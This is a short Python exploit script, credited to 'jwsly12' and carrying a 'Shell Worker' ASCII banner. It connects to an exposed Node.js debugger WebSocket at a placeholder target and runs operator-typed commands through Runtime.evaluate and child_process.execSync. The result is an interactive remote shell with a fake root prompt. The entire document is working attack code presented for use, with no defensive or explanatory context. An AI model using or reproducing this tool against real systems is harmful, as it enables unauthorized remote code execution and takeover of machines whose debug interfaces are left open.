import websockets
import json
import asyncio

target = "ws://TARGET:PORT/32d75aa9-0493-4ab3-9976-551160acb5db"

VERMELHO = "\x1b[31m";
VERDE = "\x1b[32m";
CIANO = "\x1b[96m"
RESET = "\x1b[0m";

async def socket_exploit(target):
    async with websockets.connect(target) as ws:
        banner = """
 ____  _          _ ___        __         _
/ ___|| |__   ___| | \ \      / ___  _ __| | _____ _ __
\___ \| '_ \ / _ | |  \ \ /\ / / _ \| '__| |/ / _ | '__|
 ___) | | | |  __| |   \ V  V | (_) | |  |   |  __| |
|____/|_| |_|\___|_|_   \_/\_/ \___/|_|  |_|\_\___|_|
        """

        print(f"{CIANO}{banner}{CIANO}")

        print(f"{VERMELHO}by jwsly12\n{VERMELHO}")
        while True:
            user_command = input(f"{RESET}root@worker-# {RESET}")
            if user_command == "exit":
                print("Bye...")
                break

            cmd = f"process.mainModule.require('child_process').execSync('{user_command}').toString()"
            payload = {
                "id": 1,
                "method": "Runtime.evaluate",
                "params": {"expression": cmd}
            }

            await ws.send(json.dumps(payload))

            while True:
                response = json.loads(await ws.recv())
                if response.get("id") == 1:
                    res = response.get('result', {})
                    if 'result' in res:
                        print(res['result'].get('value', ''), end='')
                    elif 'exceptionDetails' in res:
                        print("Erro:", res['exceptionDetails']['exception']['description'])
                    break

asyncio.run(socket_exploit(target))
